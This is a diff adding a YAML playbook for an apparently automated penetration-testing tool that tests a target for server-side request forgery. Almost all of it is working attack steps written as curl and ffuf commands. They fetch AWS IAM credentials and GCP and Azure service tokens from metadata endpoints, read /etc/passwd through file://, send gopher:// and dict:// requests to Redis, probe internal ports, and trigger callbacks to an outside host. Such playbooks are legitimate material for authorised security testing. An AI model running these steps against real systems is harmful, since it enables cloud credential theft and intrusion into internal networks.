@@ -1,0 +1,216 @@
+name: "Server-Side Request Forgery (SSRF)"
+description: "SSRF detection and exploitation: blind SSRF via Collaborator/Interactsh, cloud metadata access, internal port scanning, and protocol smuggling"
+version: "1.0"
+
+vars:
+  callback: ""
+  wordlist: "/wordlists/webcontent-top-10000.txt"
+
+preflight:
+  - id: setup
+    type: log
+    message: "SSRF assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Entry point discovery ----
+  - id: discovery
+    name: "Find potential SSRF entry points"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: param_fuzz
+        name: "Fuzz common SSRF parameters"
+        tool: ffuf
+        args: ["-u", "{target}/?FUZZ=http://{callback}/ssrf",
+               "-w", "/wordlists/ssrf-params.txt",
+               "-mc", "200,302,500",
+               "-o", "{case_dir}/ffuf-ssrf.json", "-of", "json",
+               "-ac"]
+        timeout: 120
+        artifacts: ["{case_dir}/ffuf-ssrf.json"]
+
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-ssrf.txt"]
+        timeout: 60
+
+      - id: curl_inject
+        name: "Header-based SSRF probes"
+        tool: curl
+        args: ["-s", "-H", "X-Forwarded-For: {callback}", "-H", "X-Real-IP: {callback}",
+               "-H", "X-Forwarded-Host: {callback}", "{target}",
+               "-D", "{case_dir}/ssrf-headers.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ssrf-headers.txt"]
+
+  # ---- Phase 2: Cloud metadata ----
+  - id: cloud_metadata
+    name: "Cloud metadata endpoint SSRF"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: aws_metadata
+        name: "AWS IMDSv1"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://169.254.169.254/latest/meta-data/",
+               "{target}", "-o", "{case_dir}/ssrf-aws-imds.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ssrf-aws-imds.txt"]
+
+      - id: aws_meta_iam
+        name: "AWS IMDS — IAM role"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+               "{target}", "-o", "{case_dir}/ssrf-aws-iam.txt"]
+        timeout: 30
+
+      - id: aws_meta_userdata
+        name: "AWS IMDS — user-data"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://169.254.169.254/latest/user-data",
+               "{target}", "-o", "{case_dir}/ssrf-aws-userdata.txt"]
+        timeout: 30
+
+      - id: gcp_metadata
+        name: "GCP metadata"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+               "-H", "Metadata-Flavor: Google",
+               "{target}", "-o", "{case_dir}/ssrf-gcp.txt"]
+        timeout: 30
+
+      - id: azure_metadata
+        name: "Azure IMDS"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+               "-H", "Metadata: true",
+               "{target}", "-o", "{case_dir}/ssrf-azure.txt"]
+        timeout: 30
+
+  # ---- Phase 3: Internal port scan ----
+  - id: port_scan
+    name: "Internal port scanning via SSRF"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: scan_localhost_80
+        name: "localhost:80 probe"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://127.0.0.1:80/",
+               "{target}", "-o", "{case_dir}/ssrf-localhost-80.txt",
+               "-m", "5"]
+        timeout: 30
+
+      - id: scan_localhost_443
+        name: "localhost:443 probe"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://127.0.0.1:443/",
+               "{target}", "-o", "{case_dir}/ssrf-localhost-443.txt",
+               "-m", "5"]
+        timeout: 30
+
+      - id: scan_localhost_8080
+        name: "localhost:8080 probe"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://127.0.0.1:8080/",
+               "{target}", "-o", "{case_dir}/ssrf-localhost-8080.txt",
+               "-m", "5"]
+        timeout: 30
+
+      - id: scan_localhost_3306
+        name: "localhost:3306 (MySQL) probe"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://127.0.0.1:3306/",
+               "{target}", "-o", "{case_dir}/ssrf-localhost-3306.txt",
+               "-m", "5"]
+        timeout: 30
+
+      - id: scan_localhost_6379
+        name: "localhost:6379 (Redis) probe"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://127.0.0.1:6379/",
+               "{target}", "-o", "{case_dir}/ssrf-localhost-6379.txt",
+               "-m", "5"]
+        timeout: 30
+
+  # ---- Phase 4: Protocol smuggling ----
+  - id: protocol_smuggle
+    name: "Protocol smuggling via SSRF"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: smuggle_file
+        name: "file:// protocol"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=file:///etc/passwd",
+               "{target}", "-o", "{case_dir}/ssrf-file-proto.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ssrf-file-proto.txt"]
+
+      - id: smuggle_dict
+        name: "dict:// protocol"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=dict://127.0.0.1:6379/info",
+               "{target}", "-o", "{case_dir}/ssrf-dict-proto.txt"]
+        timeout: 30
+
+      - id: smuggle_gopher
+        name: "gopher:// protocol"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=gopher://127.0.0.1:6379/_INFO",
+               "{target}", "-o", "{case_dir}/ssrf-gopher-proto.txt"]
+        timeout: 30
+
+      - id: smuggle_ftp
+        name: "ftp:// protocol"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=ftp://anonymous:test@127.0.0.1/",
+               "{target}", "-o", "{case_dir}/ssrf-ftp-proto.txt"]
+        timeout: 30
+
+  # ---- Phase 5: Blind SSRF callback detection ----
+  - id: blind_ssrf
+    name: "Blind SSRF with callback detection"
+    type: sequential
+    steps:
+      - id: callback_http
+        name: "HTTP callback test"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://{callback}/ssrf-test-http",
+               "{target}", "-o", "{case_dir}/ssrf-callback-http.txt",
+               "-m", "10"]
+        timeout: 60
+
+      - id: callback_dns
+        name: "DNS callback test"
+        tool: curl
+        args: ["-s", "-X", "GET",
+               "-d", "url=http://{callback}.burpcollaborator.net/ssrf-test-dns",
+               "{target}", "-o", "{case_dir}/ssrf-callback-dns.txt",
+               "-m", "10"]
+        timeout: 60
+
+  # ---- Phase 6: Report ----
+  - id: report
+    name: "SSRF assessment note"
+    type: log
+    message: |
+      SSRF assessment complete for {target}.
+      Check {case_dir}/ for cloud metadata, port scan, protocol smuggling, and callback results.
+      Monitor {callback} for outbound connections.
